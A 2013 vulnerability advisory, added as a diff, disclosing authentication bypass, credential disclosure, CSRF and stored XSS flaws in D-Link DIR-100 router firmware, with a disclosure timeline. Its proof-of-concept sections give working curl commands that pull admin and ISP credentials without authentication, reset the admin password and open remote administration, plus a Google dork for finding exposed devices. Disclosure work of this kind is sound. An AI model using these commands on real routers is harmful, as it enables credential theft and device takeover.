@@ -1,0 +1,198 @@
+* Title: Router D-Link DIR-100 Multiple Vulnerabilities
+* Date: 2013-09-19
+* Author: Felix Richter
+* Contact: root@euer.krebsco.de
+* Vulnerable Software: ftp://ftp.dlink.de/dir/dir-100/driver_software/DIR-100_fw_revd_403b07_ALL_de_20120410.zip
+* Patched Software:    ftp://ftp.dlink.de/dir/dir-100/driver_software/DIR-100_fw_revd_403b13_ALL_de_20131011.zip
+* Report Version: 2.0
+* Report URL: http://pigstarter.krebsco.de/report/2013-12-18_dir100.txt
+* Vulnerable: D-Link DIR-100
+    * Hardware Revision: D1
+    * Software Version: 4.03B07 (from 2012-04-10)
+* CVE Numbers: 
+    * CWE-287 Authentication Issues:             CVE-2013-7051
+    * CWE-255 Issues with Credential Management: CVE-2013-7052
+    * CWE-352 Cross-Site Request Forgery:        CVE-2013-7053
+    * CWE-79  Cross-Site Scripting:              CVE-2013-7054
+    * CWE-200 Information Disclosure:            CVE-2013-7055
+* Google Dork: "D-Link Systems" inurl:bsc_internet.htm D1
+* State: Patched by Vendor
+* Link to Vendor Report: http://more.dlink.de/sicherheit/news.html#news8
+
+# Table of Contents
+
+    1. Background
+    2. Vulnerability Description
+    3. Technical Description
+    4. Severity and Remediation
+    5. Timeline
+
+# 1. Background
+
+The DIR-100 is designed for easy and robust connectivity among heterogeneous
+standards-based network devices. Computers can communicate directly with this
+router for automatic opening and closing of UDP/TCP ports to take full
+advantage of the security provided without sacrificing functionality of on-line
+applications.
+
+# 2 Vulnerability Description
+
+Multiple vulnerabilities have been found in the D-Link DIR-100 Ethernet
+Broadband Router Revision D (and potentially other devices sharing the 
+affected firmware) that could allow a remote attacker:
+
+ - Retrieve the Administrator password without authentication leading to
+   authentication bypass [CWE-255]
+ - Retrieve sensitive configuration paramters like the pppoe username and
+   password without authentication [CWE-200]
+ - Execute privileged Commands without authentication through a race
+   condition leading to weak authentication enforcement [CWE-287]
+ - Sending formatted request to a victim which then will execute arbitrary
+   commands on the device (CSRF) [CWE-352]
+ - Store arbitrary javascript code which will be executed when a victim
+   accesses the administrator interface [CWE-79]
+
+CVE-Numbers for these vulnerabilities has not yet been assigned.
+
+# 3 Technical Description of the Vulnerabilities
+
+## 3.0 The DIR-100 Web Interface and CGI
+
+The DIR-100 Web interface provides a cgi-script on `/cliget.cgi` for
+unauthenticated users and `/cli.cgi` for authenticated requests.
+
+list of features provided by each cgi-script can be retrieved by:
+
+    curl 'http://192.168.1.104/cliget.cgi?cmd=help'
+    # and respectively when authenticated
+    curl 'http://192.168.1.104/cli.cgi?cmd=help'
+
+## 3.1 Authentication Bypass
+
+### Description
+
+The administrator password is not protected in any way on the device, every
+attacker with access to the administrator interface which listens on port 80.
+For retrieving the Administrator password the request must not be
+authenticated. 
+
+
+### Proof of Concept
+
+The web interface provides two distinct ways to retrieve the adminstrator
+password:
+
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$sys_user1'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=easysetup%20summary'
+
+## 3.2 Weak Authentication
+
+### Description
+
+As soon as a user is logged into the administration interface, the cli CGI
+is `unlocked` and can be used by without authenticating before as
+the cgi-script does not check any other authentication parameters such as
+cookies or HTTP Parameters. The only access check is if the IP-Address is 
+the same. 
+
+### Proof of Concept
+    
+    # open the router interface in a web browser and log in
+    firefox  'http://192.168.0.1/' 
+    
+    # open a new terminal or another web-browser which is currently not logged
+    # in and try to access
+
+    curl 'http://192.168.0.1/cli.cgi?cmd=help'
+
+    # this request will be authenticated and it will not be redirected to the
+    # login page. If no user is logged in, the request will be redirected to
+    # the login 
+
+## 3.3 Retrieve sensitive information
+
+### Description
+
+Besides retrieving the administrator password without authentication it is
+possible to retrieve other sensitive configuration from the device as well like
+the PPTP and poe Username and Password, as well as the configured dyndns
+username and password and configured mail log credentials when these parameters
+are configured. 
+No authentication is requred.
+
+### Proof of Concept
+
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$ddns1'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$poe_user'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$poe_pass'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp_user'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$pptp_pass'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$log_mail_user'
+    curl 'http://192.168.0.1/cliget.cgi?cmd=$log_mail_pwd'
+
+## 3.4 Cross-Site Request Forgery (CSRF)
+
+### Description
+
+CSRF attacks can be launched by sending a formatted request to a victim, then
+tricking the victim into loading the request (often automatically), which
+makes it appear that the request came from the victim. As an example the
+attacker could change the administrator password (see Proof of Concept code)
+and enable system remote access.
+
+### Proof of Concept
+
+Changing the password for administrator can be done when the ip-address is
+authenticated:
+
+    # Log into DIR-100
+    curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'
+
+    # Change password
+    curl 'http://192.168.0.1/cli.cgi?cmd=$sys_user1=user=admin&pass=c%;$sys_passHash=4%25;commit'
+
+    # enable remote console
+    curl 'http://192.168.0.1/cli.cgi?cmd=$sys_remote_enable=1%25;$sys_remote_ip=0.0.0.0%25;$sys_remote_port=80%25;commit'
+
+## 3.5 Cross-Site Scripting (XSS)
+
+### Description
+
+It is possible for an authenticated user to store information on the server
+which will not be checked on the server side for special characters which
+results in persistent Cross-Site Scripting Vulnerabilities. With this
+vulnerabilty the victim (administrator) will run javascript code in the 
+context of the D-Link DIR-100.
+
+XSS is possible because only on the client side (javascript code) the input is
+filtered and validated, sending data directly to the CGI scripts.
+
+### Proof of Concept
+
+    # Log into DIR-100
+    curl -X POST -d 'uname=admin&pws=password&login=Login' 'http://192.168.0.1/login.htm'
+
+    #  XSS in Static IP Address Tab
+    curl 'http://192.168.1.104/cli.cgi?cmd=dhcps%20set%20name=<script>alert(1)</script>%26ip=192.168.0.199%26mac=00:11:22:33:44:55%26flg=1%26exp='
+
+    # XSS in Scheduler tab
+    curl 'http://192.168.1.104/cli.cgi?cmd=$sched2=schen=1%26time=0-60%26day=5%26desc=<script>alert(1)</script>%26use=0%26idx=2%26;commit'
+
+# 4 Severity and Remediation
+
+This exploits are considered very critical, especially when the feature of remote
+administration is activated on the system.  
+Weak authentication, together with cross-site request forgery and authentication 
+bypass can result in a full device compromise from an arbitrary website the victim is
+accessing, even if the device has remote administration deactivated on the
+internet-port. It is recommended to upgrade the router with the newest firmware
+of the D-Link DIR-100.
+
+# 5 Timeline
+
+2013-09-13 - First Contact with D-Link Support
+2013-09-19 - Sent Report
+2013-10-14 - Request Status update, Response: Beta will be available mid October
+2013-12-02 - Vendor publishes Firmware Update 
+2013-12-11 - Request CVE-IDs
+2013-12-18 - Publish the report
